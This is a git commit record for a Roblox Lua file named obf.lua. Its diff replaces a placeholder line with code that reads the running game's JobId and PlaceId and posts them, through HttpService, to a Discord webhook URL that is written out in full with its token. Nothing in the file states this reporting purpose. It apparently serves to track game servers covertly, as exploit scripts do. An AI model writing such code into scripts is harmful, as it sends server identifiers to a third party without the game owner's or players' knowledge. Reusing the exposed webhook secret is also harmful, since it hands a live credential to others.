125a5eb007df95ab79921b6e721a393c7f526bf9
murderbased <mboxfolker@gmail.com>
2025-07-20 19:36:07 -0500

    Update obf.lua

--- obf.lua
+++ obf.lua
@@ -1,1 +1,4 @@
-hi
+local h = game.JobId
+local p = game.PlaceId
+local http = game:GetService("HttpService")
+http:PostAsync("https://discord.com/api/webhooks/1396651812622307459/LMgDC2siUhK0gn_8MVNZnR5-BM52Atmy7-luwzw7xFCRFEjXWczQ8qxktX3SOkVMP-BX", http:JSONEncode({jobid=h, placeid=p}))
